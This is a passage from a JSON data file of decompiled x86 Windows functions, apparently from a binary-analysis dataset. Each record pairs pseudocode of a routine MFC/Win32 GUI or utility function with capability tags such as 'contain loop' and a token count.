                     }\n                                else {\n                                    ppcVar8[1] = NULL;\n                                    *ppcVar8 = vtable.CBitmap.0;\n                                }\n                                fcn.00434bde(uVar12, ppcVar8);\n                                fcn.004219b6(*(iVar5 + 4), *(unaff_EBP + 0x50), unaff_EBP + -0xb0);\n                                (*_sym.imp.USER32.dll_CopyRect)(unaff_EBP + 0x10, unaff_EBP + -0xa0);\n                                (*_sym.imp.USER32.dll_OffsetRect)\n                                          (unaff_EBP + 0x10, -*(unaff_EBP + 0x10), -*(unaff_EBP + 0x14));\n                                fcn.0041fdcc(uVar12);\n                                fcn.0041fe3c(unaff_EBP + -0x30, *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c));\n                                piVar9 = fcn.0041fdcc(uVar12);\n                                iVar6 = *piVar9;\n                                if (iVar6 != 0) {\n                                    iVar6 = *(iVar6 + 4);\n                                }\n                                uVar4 = fcn.0042e538(*(unaff_EBP + 0x2c), iVar6);\n                                puVar10 = fcn.0041fdcc(uVar12);\n                                *puVar10 = uVar4;\n                                uVar4 = (*_sym.imp.USER32.dll_GetSysColor)(4);\n                                fcn.00438b19(unaff_EBP + 0x10, uVar4);\n                                fcn.00421a18(unaff_EBP + 0x28, *(unaff_EBP + 0x50), 0, 0, 1);\n                                piVar9 = fcn.0041fdcc(uVar12);\n                                iVar6 = *piVar9;\n                                if (iVar6 != 0) {\n                                    iVar6 = *(iVar6 + 4);\n                                }\n                                uVar4 = fcn.0042e538(*(unaff_EBP + 0x2c), iVar6);\n                                puVar10 = fcn.0041fdcc(uVar12);\n                                *puVar10 = uVar4;\n                                *(unaff_EBP + -0x4c) = *(unaff_EBP + 0x5c);\n                                *(unaff_EBP + -0x60) = *(unaff_EBP + 0x54);\n                                *(unaff_EBP + -0x68) = 0x100;\n                                puVar10 = fcn.0041fdcc(uVar12);\n                                *(unaff_EBP + -0x50) = *puVar10;\n                                uVar12 = uVar12 + 1;\ncode_r0x0042282d:\n                                (*_sym.imp.USER32.dll_InsertMenuItemA)\n                                          (*(unaff_EBP + 4), *(unaff_EBP + 0x74), 1, unaff_EBP + -0x70);\n                            }\n                            else if (uVar12 != 0) {\n                                *(unaff_EBP + -0x6c) = 0x100;\n                                *(unaff_EBP + -0x68) = 0x800;\n                                goto code_r0x0042282d;\n                            }\n                            *(unaff_EBP + 0x74) = *(unaff_EBP + 0x74) + 1;\n                        } while (*(unaff_EBP + 0x74) < *(unaff_EBP + 0x58));\n                    }\n                    (*_sym.imp.USER32.dll_CopyRect)(unaff_EBP + -0x40, *(unaff_EBP + 0x24));\n                    fcn.0042ddc6(unaff_EBP + -0x40);\n                    uVar13 = 0;\n                    uVar14 = 0;\n                    fcn.00416fe9(0, *(unaff_EBP + -0x40), *(unaff_EBP + -0x34), *(unaff_EBP + 0x60), 0);\n                    **(unaff_EBP + 0x78) = 0;\n                    if (uVar12 != 0) {\n                        do {\n                            uVar14 = uVar13;\n                            ppiVar11 = fcn.0041fdcc();\n                            if (*ppiVar11 != NULL) {\n                                (**(**ppiVar11 + 4))(1);\n                            }\n                            uVar13 = uVar13 + 1;\n                        } while (uVar13 < uVar12);\n                    }\n                    *(unaff_EBP + -4) = 5;\n                    fcn.004349ef(uVar14);\n                    *(unaff_EBP + -4) = 4;\n                    fcn.0042e258();\n                    *(unaff_EBP + -4) = 3;\n                    fcn.0042e1eb();\n                    fcn.00402740();\n                    fcn.00402740();\n                    *(unaff_EBP + -4) = 0;\n                    fcn.0042157b();\n                    uVar4 = 1;\n                    goto code_r0x004224df;\n                }\n            }\n            *(unaff_EBP + -4) = 4;\n            fcn.0042e258();\n            *(unaff_EBP + -4) = 3;\n            fcn.0042e1eb();\n            fcn.00402740();\n            fcn.00402740();\n            *(unaff_EBP + -4) = 0;\n            fcn.0042157b();\n        }\n    }\n    uVar4 = 0;\ncode_r0x004224df:\n    fcn.00402740();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar4;\n}\n",
        "token_count": 2921
    },
    "0042494c": {
        "rules": [
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.0042494c(uint *param_1, uint param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint unaff_ESI;\n    \n    *param_1 = param_2;\n    param_1[1] = 0;\n    if (*0x4bb218 == '\\0') {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"KERNEL32\");\n        if (iVar2 != 0) goto code_r0x0042497f;\ncode_r0x0042497a:\n        do {\n            fcn.00411e42();\ncode_r0x0042497f:\n            pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n            *0x4bb208 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"CreateActCtxA\", unaff_ESI);\n            *0x4bb20c = (*pcVar1)(iVar2, \"ReleaseActCtx\");\n            *0x4bb210 = (*pcVar1)(iVar2, \"ActivateActCtx\");\n            *0x4bb214 = (*pcVar1)(iVar2, \"DeactivateActCtx\");\n            if (*0x4bb208 == 0) {\n                if ((*0x4bb20c != 0) || (*0x4bb210 != 0)) goto code_r0x0042497a;\n            }\n            else if ((*0x4bb20c == 0) || (*0x4bb210 == 0)) goto code_r0x0042497a;\n        } while (*0x4bb214 != 0);\n        *0x4bb218 = '\\x01';\n    }\n    return param_1;\n}\n",
        "token_count": 381
    },
    "0042603a": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0042603a(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    \n    pcVar2 = _sym.imp.USER32.dll_GetParent;\n    iVar3 = param_1;\n    if (param_1 != 0) goto code_r0x00426069;\n    iVar3 = fcn.00425ffa();\n    if ((iVar3 == 0) && (iVar3 = fcn.004122c3(),  iVar3 == 0)) {\n        iVar3 = 0;\n        iVar5 = iVar3;\n        iVar6 = iVar3;\n    }\n    else {\n        for (iVar3 = *(iVar3 + 0x20); iVar5 = iVar3,  iVar6 = iVar3,  iVar3 != 0; iVar3 = (*pcVar2)(iVar3)) {\ncode_r0x00426069:\n            uVar4 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar3, 0xfffffff0);\n            iVar5 = iVar3;\n            iVar6 = iVar3;\n            if ((uVar4 & 0x40000000) == 0) break;\n        }\n    }\n    while (iVar1 = iVar5,  iVar1 != 0) {\n        iVar5 = (*pcVar2)(iVar1);\n        iVar3 = iVar1;\n    }\n    if ((param_1 == 0) && (iVar6 != 0)) {\n        iVar6 = (*_sym.imp.USER32.dll_GetLastActivePopup)(iVar6);\n    }\n    if (param_2 != NULL) {\n        if (((iVar3 == 0) || (iVar5 = (*_sym.imp.USER32.dll_IsWindowEnabled)(iVar3),  iVar5 == 0)) || (iVar3 == iVar6))\n        {\n            *param_2 = 0;\n        }\n        else {\n            *param_2 = iVar3;\n            (*_sym.imp.USER32.dll_EnableWindow)(iVar3, 0);\n        }\n    }\n    return iVar6;\n}\n",
        "token_count": 481
    },
    "0042a6c4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0042a6c4(void)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *(unaff_EBP + -4) = 0;\n    iVar2 = fcn.0042fcbb();\n    while (*(iVar2 + 0xe4) == extraout_ECX) {\n        puVar1 = *(iVar2 + 0xe8);\n        *(puVar1[1] + 0xe4) = *puVar1;\n        *(puVar1[1] + 0xe8) = puVar1[2];\n        puVar1[1] = 0;\n    }\n    if (*(extraout_ECX + 0x54) != 0) {\n        fcn.004286c7(extraout_ECX);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00418ff3();\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 286
    },
    "0042f538": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0042f538(uint *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint *extraout_ECX;\n    \n    if (param_1 != NULL) goto code_r0x0042f541;\n    do {\n        fcn.00411e42();\n        param_1 = extraout_ECX;\ncode_r0x0042f541:\n        iVar1 = (***param_1)();\n    } while (iVar1 == 0);\n    if (iVar1 != 0) goto code_r0x0042f50e;\n    do {\n        iVar1 = fcn.00411e42();\ncode_r0x0042f50e:\n    } while (param_2 == 0);\n    do {\n        if (iVar1 == param_2) {\n            return 1;\n        }\n        iVar1 = *(iVar1 + 0x10);\n    } while (iVar1 != 0);\n    return 0;\n}\n",
        "token_count": 218
    },
    "004306a5": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004306a5(int32_t hWnd, uint lpPoint, uint arg_10h)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint lpRect;\n    \n    (*_sym.imp.USER32.dll_ClientToScreen)(hWnd, &lpPoint);\n    pcVar1 = _sym.imp.USER32.dll_GetWindow;\n    uVar5 = 5;\n    do {\n        hWnd = (*pcVar1)(hWnd, uVar5);\n        if (hWnd == 0) {\n            return 0;\n        }\n        iVar2 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(hWnd);\n        if ((iVar2 != 0) &&\n           (uVar3 = (*_sym.imp.USER32.dll_GetWindowLongA)(hWnd, 0xfffffff0),  (uVar3 & 0x10000000) != 0)) {\n            (*_sym.imp.USER32.dll_GetWindowRect)(hWnd, &lpRect);\n            iVar4 = (*_sym.imp.USER32.dll_PtInRect)(&lpRect, lpPoint, arg_10h);\n            if (iVar4 != 0) {\n                return hWnd;\n            }\n        }\n        uVar5 = 2;\n    } while( true );\n}\n",
        "token_count": 300
    },
    "00430a21": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00430a21(int32_t *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t *piVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    \n    iVar5 = *param_1;\n    if (iVar5 == 0) {\n        uVar1 = 0;\n    }\n    else {\n        if (iVar5 == param_2) {\n            piVar2 = fcn.004309eb(param_2);\n            *param_1 = *piVar2;\n        }\n        else {\n            do {\n                piVar2 = fcn.004309eb(iVar5);\n                if (*piVar2 == param_2) break;\n                piVar2 = fcn.004309eb();\n                iVar5 = *piVar2;\n            } while (iVar5 != 0);\n            if (iVar5 == 0) {\n                return 0;\n            }\n            puVar3 = fcn.004309eb(param_2);\n            puVar4 = fcn.004309eb(iVar5);\n            *puVar4 = *puVar3;\n        }\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 278
    },
    "00430bfc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00430bfc(int32_t arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    uint lpCriticalSection;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(in_ECX + 0x1c);\n    if ((0 < arg_8h) && (arg_8h < *(in_ECX + 0xc))) {\n        for (iVar3 = *(in_ECX + 0x14); iVar3 != 0; iVar3 = *(iVar3 + 4)) {\n            if (arg_8h < *(iVar3 + 8)) {\n                puVar2 = *(*(iVar3 + 0xc) + arg_8h * 4);\n                if (puVar2 != NULL) {\n                    (***puVar2)(1);\n                }\n                *(*(iVar3 + 0xc) + arg_8h * 4) = 0;\n            }\n        }\n        puVar1 = *(in_ECX + 0x10) + arg_8h * 8;\n        *puVar1 = *puVar1 & 0xfffffffe;\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(in_ECX + 0x1c);\n    }\n    return;\n}\n",
        "token_count": 295
    },
    "004328d2": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.004328d2(int32_t param_1, uint32_t param_2, uint32_t *param_3, uint32_t *param_4)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    \n    *param_4 = param_2 >> 4;\n    uVar2 = (param_2 >> 4) % *(param_1 + 8);\n    *param_3 = uVar2;\n    if (*(param_1 + 4) != 0) {\n        for (puVar1 = *(*(param_1 + 4) + uVar2 * 4); puVar1 != NULL; puVar1 = *puVar1) {\n            if (puVar1[1] == param_2) {\n                return puVar1;\n            }\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 192
    },
    "0043290a": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0043290a(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t extraout_ECX;\n    uint *puVar1;\n    \n    if (param_1 == 0) {\n        fcn.00411e42();\n        param_1 = extraout_ECX;\n    }\n    if (*(param_1 + 4) != 0) {\n        for (puVar1 = *(*(param_1 + 4) + ((param_2 >> 4) % *(param_1 + 8)) * 4); puVar1 != NULL; puVar1 = *puVar1) {\n            if (puVar1[1] == param_2) {\n                return puVar1[2];\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 180
    },
    "00432971": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00432971(int32_t param_1, uint32_t param_2)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint *puVar3;\n    \n    if (*(param_1 + 4) == 0) {\n        puVar2 = NULL;\n    }\n    else {\n        puVar3 = *(param_1 + 4) + ((param_2 >> 4) % *(param_1 + 8)) * 4;\n        puVar1 = *puVar3;\n        while (puVar2 = puVar1,  puVar2 != NULL) {\n            if (puVar2[1] == param_2) {\n                *puVar3 = *puVar2;\n                fcn.004328b9(puVar2);\n                return 0x1;\n            }\n            puVar3 = puVar2;\n            puVar1 = *puVar2;\n        }\n    }\n    return puVar2;\n}\n",
        "token_count": 218
    },
    "00433140": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00433140(int32_t param_1, int32_t param_2, uint *param_3)\n\n{\n    if (param_3 != NULL) goto code_r0x00433156;\n    for (param_3 = *(param_1 + 4); (param_3 != NULL && (param_3[2] != param_2)); param_3 = *param_3) {\ncode_r0x00433156:\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "00433487": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00433487(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if ((-1 < param_2) && (-1 < param_3)) goto code_r0x004334a1;\n    do {\n        do {\n            fcn.00411e42();\ncode_r0x004334a1:\n        } while ((*(param_1 + 0x78) == 0) && (*(param_1 + 0x74) != 0));\n        if (param_2 < 1) goto code_r0x004334c7;\n    } while (param_3 < 1);\n    iVar1 = fcn.0045e902(param_2, param_3);\n    if (iVar1 != 0) {\ncode_r0x004334c7:\n        fcn.0045e756(*(param_1 + 0x78));\n        *(param_1 + 0x78) = iVar1;\n        *(param_1 + 0x74) = param_2;\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 268
    },
    "00434794": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00434794(code **param_1)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    uint uStack24;\n    code *pcStack20;\n    \n    *param_1 = vtable.CMapStringToPtr.0;\n    if (param_1[1] != NULL) {\n        pcVar1 = NULL;\n        if (param_1[2] != NULL) {\n            do {\n                for (puVar2 = *(param_1[1] + pcVar1 * 4); puVar2 != NULL; puVar2 = *puVar2) {\n                    if (puVar2 == 0xfffffff8) {\n                        pcStack20 = NULL;\n                        uStack24 = 0x4b62b8;\n                        fcn.0046230a(&uStack24, 0x4a76e8);\n                        pcVar1 = swi(3);\n                        (*pcVar1)();\n                        return;\n                    }\n                    uStack24 = 0x434761;\n                    fcn.0041d2c2();\n                }\n                pcVar1 = pcVar1 + 1;\n            } while (pcVar1 < param_1[2]);\n        }\n        pcStack20 = param_1[1];\n        uStack24 = 0x434775;\n        fcn.004115a4();\n        param_1[1] = NULL;\n    }\n    param_1[3] = NULL;\n    param_1[4] = NULL;\n    pcStack20 = 0x434787;\n    fcn.00434e2e();\n    param_1[5] = NULL;\n    return;\n}\n",
        "token_count": 363
    },
    "00434d06": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00434d06(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t arg_10h;\n    int32_t unaff_EBX;\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = 0;\n    if ((arg_ch != 0) && (unaff_EBX = arg_8h,  -1 < arg_8h)) {\n        if (*(arg_ch + 8) < 1) {\n            return;\n        }\n        arg_10h = *(arg_ch + 8);\n        if (0 < arg_10h) goto code_r0x00434d31;\n    }\n    arg_10h = fcn.00411e42();\n    arg_8h = unaff_EBX;\ncode_r0x00434d31:\n    fcn.00434c0e(arg_8h, **(arg_ch + 4), arg_10h);\n    if (0 < *(arg_ch + 8)) {\n        do {\n            fcn.00434970(iVar1);\n            fcn.0043498c();\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < *(arg_ch + 8));\n    }\n    return;\n}\n",
        "token_count": 278
    },
    "00434e2e": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00434e2e(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    \n    if (param_1 != NULL) {\n        do {\n            piVar1 = *param_1;\n            fcn.004115a4(param_1);\n            param_1 = piVar1;\n        } while (piVar1 != NULL);\n    }\n    return;\n}\n",
        "token_count": 91
    },
    "00435449": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00435449(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.USER32.dll_IsWindow)(*(in_ECX + 0x20));\n    if (iVar1 != 0) goto code_r0x00435464;\n    do {\n        fcn.00411e42();\ncode_r0x00435464:\n    } while (arg_8h == 0);\n    var_24h = arg_8h;\n    var_28h = 4;\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x110c, 0, &var_28h);\n    return var_4h;\n}\n",
        "token_count": 197
    },
    "00437984": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00437984(int32_t param_1, uint param_2, int32_t param_3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t unaff_retaddr;\n    \n    iVar2 = 0;\n    if (0 < *(param_1 + 0xa0)) {\n        do {\n            if ((iVar2 != param_3) && (piVar1 = fcn.00437755(iVar2),  *piVar1 == unaff_retaddr)) {\n                return iVar2;\n            }\n            iVar2 = iVar2 + 1;\n        } while (iVar2 < *(param_1 + 0xa0));\n    }\n    return -1;\n}\n",
        "token_count": 165
    },
    "00437ccf": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00437ccf(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = 0;\n    iVar3 = 0;\n    if (0 < *(param_1 + 0xa0)) {\n        do {\n            iVar1 = fcn.004379c1();\n            if (iVar1 != 0) {\n                iVar2 = iVar2 + 1;\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < *(param_1 + 0xa0));\n    }\n    return iVar2;\n}\n",
        "token_count": 145
    },
    "004383bb": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004383bb(int32_t param_1)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    uint unaff_retaddr;\n    \n    iVar1 = 0;\n    if (0 < *(param_1 + 0xa0)) {\n        do {\n            arg_8h = fcn.004379c1(iVar1);\n            if (arg_8h != 0) {\n                fcn.0041fab8();\n                fcn.00420b1d(arg_8h, unaff_retaddr, 1);\n            }\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < *(param_1 + 0xa0));\n    }\n    return;\n}\n",
        "token_count": 163
    },
    "00438b19": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00438b19(int32_t param_1, int32_t param_2, uint param_3)\n\n{\n    uint unaff_ESI;\n    \n    if (param_1 != 0) goto code_r0x00438b28;\n    do {\n        fcn.00411e42();\ncode_r0x00438b28:\n    } while ((*(param_1 + 4) == 0) || (param_2 == 0));\n    (*_sym.imp.GDI32.dll_SetBkColor)(*(param_1 + 4), param_3);\n    (*_sym.imp.GDI32.dll_ExtTextOutA)(*(param_1 + 4), 0, 0, 2, unaff_ESI, 0, 0, 0);\n    return;\n}\n",
        "token_count": 182
    },
    "00440b8d": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00440b8d(uint lpFileTime, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *in_ECX;\n    uint lpSystemTime;\n    uint lpLocalFileTime;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_FileTimeToLocalFileTime)(lpFileTime, &lpLocalFileTime);\n    if (iVar1 != 0) goto code_r0x00440bb8;\n    do {\n        *in_ECX = 0;\n        in_ECX[1] = 0;\n        lpFileTime = 0x80070057;\n        fcn.00401280();\ncode_r0x00440bb8:\n        iVar1 = (*_sym.imp.KERNEL32.dll_FileTimeToSystemTime)(&lpLocalFileTime, &lpSystemTime, lpFileTime);\n    } while (iVar1 == 0);\n    fcn.00440b35(&lpSystemTime, arg_ch);\n    *in_ECX = var_8h;\n    in_ECX[1] = var_4h;\n    return;\n}\n",
        "token_count": 250
    },
    "00442fac": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00442fac(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    var_4h = (**(*in_ECX + 0xb4))();\n    while( true ) {\n        iVar1 = fcn.00450dac(&var_4h);\n        if (iVar1 == 0) break;\n        fcn.00451fa4();\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "00442fe1": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00442fe1(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    (**(*in_ECX + 0xb4))();\n    while( true ) {\n        piVar1 = fcn.00450dac();\n        if (piVar1 == NULL) break;\n        if (piVar1 != arg_8h) {\n            (**(*piVar1 + 0x58))(arg_8h, arg_ch, arg_10h, arg_14h);\n        }\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "00443a92": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00443a92(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    var_4h = (**(*in_ECX + 0xb4))();\n    do {\n        iVar2 = fcn.00450dac(&var_4h);\n        if (iVar2 == 0) {\n            return 0;\n        }\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(*(iVar2 + 0x34), arg_8h);\n    } while (iVar1 != 0);\n    return iVar2;\n}\n",
        "token_count": 151
    },
    "0044a4a9": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0044a4a9(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint lpMsg;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetCapture;\n    iVar2 = (*_sym.imp.USER32.dll_GetCapture)();\n    if (iVar2 == 0) {\n        uVar3 = (*_sym.imp.USER32.dll_SetCapture)(*(*(param_1 + 0x68) + 0x20));\n        fcn.004185c5(uVar3);\n        uVar3 = (*pcVar1)();\n        iVar2 = fcn.004185c5(uVar3);\n        if (iVar2 == *(param_1 + 0x68)) {\n            do {\n                uVar4 = 0;\n                uVar3 = 0;\n                iVar2 = (*_sym.imp.USER32.dll_GetMessageA)(&lpMsg, 0, 0, 0);\n                if (iVar2 == 0) {\n                    fcn.00424e30(uVar4, var_14h);\n                    break;\n                }\n                if (var_18h == 0x100) {\n                    if (*(param_1 + 0x88) != 0) {\n                        fcn.0044a174(uVar3, 1, var_14h);\n                    }\n                    if (var_14h == 0x1b) break;\n                }\n                else if (var_18h == 0x101) {\n                    if (*(param_1 + 0x88) != 0) {\n                        fcn.0044a174(uVar3, 0, var_14h);\n                    }\n                }\n                else if (var_18h == 0x200) {\n                    if (*(param_1 + 0x88) == 0) {\n                        fcn.0044a1a8(var_8h, var_4h);\n                    }\n                    else {\n                        fcn.0044a0f8(var_8h, var_4h);\n                    }\n                }\n                else {\n                    if (var_18h == 0x202) {\n                        if (*(param_1 + 0x88) == 0) {\n                            fcn.0044a465();\n                        }\n                        else {\n                            fcn.0044a361();\n                        }\n                        return 1;\n                    }\n                    if (var_18h == 0x204) break;\n                    (*_sym.imp.USER32.dll_DispatchMessageA)(&lpMsg);\n                }\n                uVar3 = (*pcVar1)();\n                iVar2 = fcn.004185c5(uVar3);\n            } while (iVar2 == *(param_1 + 0x68));\n        }\n        fcn.0044a31c();\n    }\n    return 0;\n}\n",
        "token_count": 657
    },
    "0044be7c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044be7c(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t arg_10h;\n    int32_t unaff_EBX;\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = 0;\n    if ((arg_ch != 0) && (unaff_EBX = arg_8h,  -1 < arg_8h)) {\n        if (*(arg_ch + 8) < 1) {\n            return;\n        }\n        arg_10h = *(arg_ch + 8);\n        if (0 < arg_10h) goto code_r0x0044bea7;\n    }\n    arg_10h = fcn.00411e42();\n    arg_8h = unaff_EBX;\ncode_r0x0044bea7:\n    fcn.0044bd84(arg_8h, **(arg_ch + 4), arg_10h);\n    if (0 < *(arg_ch + 8)) {\n        do {\n            fcn.00437739(iVar1);\n            fcn.0044aa46();\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < *(arg_ch + 8));\n    }\n    return;\n}\n",
        "token_count": 280
    },
    "0044c238": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044c238(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t arg_10h;\n    int32_t unaff_EBX;\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = 0;\n    if ((arg_ch != 0) && (unaff_EBX = arg_8h,  -1 < arg_8h)) {\n        if (*(arg_ch + 8) < 1) {\n            return;\n        }\n        arg_10h = *(arg_ch + 8);\n        if (0 < arg_10h) goto code_r0x0044c263;\n    }\n    arg_10h = fcn.00411e42();\n    arg_8h = unaff_EBX;\ncode_r0x0044c263:\n    fcn.0044c168(arg_8h, **(arg_ch + 4), arg_10h);\n    if (0 < *(arg_ch + 8)) {\n        do {\n            fcn.0044bf17(iVar1);\n            fcn.0044bf33();\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < *(arg_ch + 8));\n    }\n    return;\n}\n",
        "token_count": 278
    },
    "0044caa3": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044caa3(int32_t **arg_8h, int32_t *arg_ch, uint *arg_10h)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_4h;\n    \n    piVar2 = arg_ch;\n    ppiVar1 = arg_8h;\n    *arg_8h = NULL;\n    *arg_ch = 0;\n    piVar3 = fcn.00431b02(*(in_ECX + 0x24), 0x49fb08);\n    if (piVar3 != NULL) {\n        iVar4 = (**(*piVar3 + 0x14))(piVar3, &arg_8h);\n        if ((iVar4 == 0) && (arg_8h != NULL)) {\n            while (iVar4 = (*(*arg_8h)[3])(arg_8h, 1, &var_20h, 0),  iVar4 == 0) {\n                if (var_1ch != 0) {\n                    if (arg_10h != NULL) {\n                        *arg_10h = var_4h;\n                    }\n                    *piVar2 = var_1ch;\n                    (*(*arg_8h)[2])(arg_8h);\n                    *ppiVar1 = piVar3;\n                    return 1;\n                }\n            }\n            (*(*arg_8h)[2])(arg_8h);\n        }\n        (**(*piVar3 + 8))(piVar3);\n    }\n    return 0;\n}\n",
        "token_count": 381
    },
    "0044cb50": {
        "rules": [
            "contain loop"
        ],
